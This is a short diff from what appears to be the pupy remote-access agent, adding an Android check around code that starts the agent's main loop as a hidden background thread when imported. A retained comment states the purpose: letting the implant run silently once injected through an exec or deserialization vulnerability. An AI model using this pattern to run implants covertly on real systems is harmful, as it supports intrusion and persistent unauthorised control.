@@ -284,6 +284,14 @@ def rpyc_loop(launcher):
 if __name__=="__main__":
     main()
 else:
-    t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
-    t.daemon=True
-    t.start()
+    is_android=False
+    try:
+        from kivy.utils import platform as kivy_plat
+        if kivy_plat=="android":
+            is_android=True
+    except:
+        pass
+    if not is_android:
+        t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
+        t.daemon=True
+        t.start()
